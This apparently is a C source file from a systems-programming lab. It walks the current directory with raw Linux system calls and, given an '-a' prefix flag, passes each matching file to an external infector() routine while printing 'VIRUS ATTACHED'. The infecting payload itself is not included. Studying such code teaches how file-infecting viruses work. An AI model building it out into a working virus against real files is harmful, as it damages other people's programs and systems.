#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

extern int system_call();
extern int infector();

typedef struct ent{
    int inode;
    int offset;
    short len;
    char buf[1];
}ent;

int main(int argc, char* argv[], char* envp[])
{
    char* pref = "";
    int prefixLen = 0;
    int flag = 0;
    int i;

    for(i = 0; i < argc; i++){
        if(strncmp(argv[i], "-a", 2) == 0){
            pref = argv[i] + 2;
            prefixLen = strlen(pref);
            flag = 1;
            break;
        }
    }
    
    char buffer[8192];
    ent* entery;
    int fd = system_call(SYS_OPEN,".",0,0);

    if(fd == -1){
        system_call(0x55);
    }

    int nread = system_call(141,fd,buffer,8192);
    int count = 0;

    while(count < nread){
        entery = buffer + count;
        system_call(4,1,entery->buf,strlen(entery->buf));

        if(flag == 1 && strncmp(pref, entery->buf, prefixLen) == 0){
            system_call(4,1," VIRUS ATTACHED",15);
            infector(entery->buf);
        }
            
        
        system_call(4,1,"\n",1);
        count += entery->len;
    }
    system_call(6, fd, 0, 0);

    return 0;
}
